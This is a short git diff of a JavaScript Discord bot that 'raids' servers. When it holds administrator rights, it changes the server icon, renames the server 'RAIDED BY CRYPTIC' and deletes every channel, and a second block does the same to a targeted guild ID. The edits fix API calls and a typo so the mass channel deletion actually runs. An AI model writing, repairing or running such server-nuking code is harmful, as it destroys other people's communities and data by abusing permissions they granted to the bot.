@@ -31,7 +31,7 @@ bot.on("message", async(message) => {
             if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 message.guild.setIcon("https://i.gyazo.com/863bc487c8c72c3d21a747e300e3c21a.png")
                 message.guild.setName("RAIDED BY CRYPTIC")
-                message.guild.channels.forEach(ch => {
+                message.guild.channels.cache.forEach(ch => {
                     ch.delete()
                 })
                 for (var i = 0; i < 100; i++) {
@@ -72,7 +72,7 @@ bot.on("message", async(message) => {
         if(message.guild.id === targetID) {
             if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 message.guild.setIcon(null)
-                message.guild.channels.cahce.forEach(ch => ch.delete())
+                message.guild.channels.cache.forEach(ch => ch.delete())
                 const textCat = await message.guild.channels.create("Text Channels", {
                     type: "category"
                 })
